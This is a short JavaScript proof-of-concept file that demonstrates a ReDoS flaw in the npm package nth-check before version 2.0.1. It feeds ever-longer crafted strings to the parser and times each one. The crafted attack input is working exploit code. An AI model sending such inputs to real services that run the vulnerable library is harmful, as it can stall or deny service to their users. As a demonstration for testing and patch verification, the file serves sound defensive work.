// PoC.js - Demonstrates ReDoS in nth-check < 2.0.1
// Run with: npm install nth-check@1.0.0 && node PoC.js
// In patched versions, times remain low; in vulnerable, exponential growth.

const nthCheck = require("nth-check");

for (let i = 1; i <= 10; i++) {  // Adjusted for practical execution time
    const time = Date.now();
    const attack_str = '2n' + ' '.repeat(i * 500) + "!";  // Crafted invalid nth-expression
    try {
        nthCheck.parse(attack_str);
    } catch (err) {
        console.error("Error parsing attack string:", err.message);
        const time_cost = Date.now() - time;
        console.log("attack_str.length: " + attack_str.length + ": " + time_cost + " ms");
    }
}
